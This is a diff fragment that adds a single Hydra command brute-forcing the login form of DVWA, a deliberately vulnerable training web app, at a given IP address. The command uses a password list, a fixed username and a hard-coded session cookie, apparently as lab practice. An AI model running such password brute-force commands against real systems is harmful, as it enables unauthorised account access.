@@ -1,0 +1,2 @@
+hydra 128.199.255.176 -V -l ajay1 -P pass.txt http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=Username and/or password incorrect.:H=Cookie: PHPSESSID=7rrol5tnauf0crfpje6vkl4f2g; security=low"
+
